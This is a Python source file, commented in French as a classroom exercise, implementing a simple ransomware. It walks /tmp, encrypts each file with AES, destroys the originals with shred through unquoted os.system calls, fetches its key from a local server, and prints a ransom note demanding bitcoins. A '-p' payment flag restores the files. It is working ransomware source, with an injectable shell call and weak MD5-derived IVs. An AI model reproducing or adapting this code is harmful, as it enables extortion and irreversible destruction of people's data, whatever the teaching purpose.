import sys
from requests.exceptions import ConnectionError
import os
import binascii
import getopt
import json
import hashlib
import requests
from Crypto.Cipher import AES



'''

Exercice de création d'un ransomware simple en python

Le programme n'a pas une vocation réaliste cf: les nombreuses exceptions gerées, le systeme de dechiffrement etc





'''



#On ajoute un padding sur les données à chiffrer pour remplir tous les blocs pour l'AES
#Pour ne pas crééer de confusion lors du dechiffrement, on s'assure que le padding est different du dernier charactere (probleme revelé lors du chiffrement de fichier binaire)
def pad(s):
	if s[len(s) - 1 ] != b"0":
		return s + b"0" * (AES.block_size - len(s) % AES.block_size)
	else :
		return s + b"1" * (AES.block_size - len(s) % AES.block_size)



#parametre un aes256 en fonction de la clé de chiffrement
def genereaes(key):

	iv = hashlib.md5(key).digest()
	cipher = AES.new(key, AES.MODE_CBC, iv)
	return cipher
	#Parametrage de l'AES
	#Pour obtenir un IV pseudo aleatoire, on utilise le md5 de la clé afin d'avoir un hash de 16 bytes. Le md5 entraine des risques de collisions mais peu contraignants ici









def getfiles():

	# Recuperation des noms de fichier dans tmp

	try:
		files = list()
		for (dirpath, dirnames, filenames) in os.walk("/tmp"):
			files += [os.path.join(dirpath, file) for file in filenames]
	except:
		print("repertoire /tmp/ introuvable")
		sys.exit()


	
	return files


#chiffre les fichiers et supprime les fichiers en clair de /tmp
def chiffre():
	#recuperation de la clé de chiffrement
	key = getkey()
	

	files = getfiles()
	# pour eviter que des fichiers soient chiffrés deux fois avec une fausse manip, uniquement dans le cadre du tp
	files = [x for x in files if not x.endswith(".enc")]


	#on parametre l'aes 256
	cipher = genereaes(key)

	#ouverture des fichiers
	for file in files:
		if file !="/tmp/test/Execme.py":

			try:


				f = open(file, "rb")
				content = f.read()

				#supression des anciens fichiers avec shred
				os.system("shred -vzu "+ file +" >/dev/null 2>&1")
				content = pad(content)

				try:
					d = cipher.encrypt(content)
				except:
					print("probleme lors du chiffrement")

				fenc = open(file+".enc", "wb")
				fenc.write(d)
				fenc.close()
			except OSError:
				continue


#dechiffre les fichiers .enc et supprime les fichiers chiffrés de /tmp
def dechiffre():
	#recuperation de la clé de dechiffrement
	key = getkey()



	files = getfiles()
	files = [x for x in files if  x.endswith(".enc")]
	

	#on parametre l'aes 256
	cipher = genereaes(key)
	

	for file in files:

		f = open(file, "rb")
		content = f.read()
		#supression des anciens fichiers avec shred
		os.system("shred -vzu "+ file+" >/dev/null 2>&1")

		try:
			d = cipher.decrypt(content)
		except:
			print("probleme lors du dechiffrement")

		#On enleve le padding, la condition verifie le type de padding à enlever (0 ou 1)
		if d[len(d) -1] != b"0":
			d = d.rstrip(b"0")
		else:
			d = d.rstrip(b"1")
		fenc = open(file.replace(".enc",""), "wb")
		fenc.write(d)
		fenc.close()





def getkey():
	try:
		r = requests.get('http://127.0.0.1:8080/cle.txt') #Le ransomware va chercher la clé sur le serveur et l'obtient en format json
		key = ((r.text).split(":"))[1]
		key = binascii.unhexlify(key)
		return key


	except ConnectionError:
		print("le serveur est injoignable | pour subir le ransomware, executez le programme serveur.py\n et laissez le ouvert pendant toute l'operation de chiffrement et dechiffrement\n\n")
		return key








def main(argv,argc):
	try:
		opts, args = getopt.getopt(argv[1:],'p') #Si pas d'options, on chiffre

	except getopt.GetoptError:
		print("option invalide")
		sys.exit()

	for opt,arg in opts:
		if opt in ('-p'):
			print("paiement du ransomware")

			print(""" 


				#######################################################
				#						      #
				#					              #
				#		Fichiers dechiffrés .......	      #
				#					              #
				#######################################################

				""")
			dechiffre()
			sys.exit()

	print("""


	 		  ###########################################################################
			  #									    #
			  #									    #
			  #		   CHIFFREMENT DE VOS DONNÉES DANS /TMP    		    #
			  #								            #
			  #									    #
			  # 	Pour recuperer vos informations, donnez nous 1000000 Bitctoins      #
			  # 	Puis appliquez la commande suivante: \"python3 Execme.py -p\"         #
			  #									    #
			  ###########################################################################



			  """)
	chiffre()


#Appel de la fonction main et prise en compte des arguments
if __name__ == "__main__" :
	try:
		main(sys.argv, len(sys.argv))
	except KeyboardInterrupt:
		sys.exit()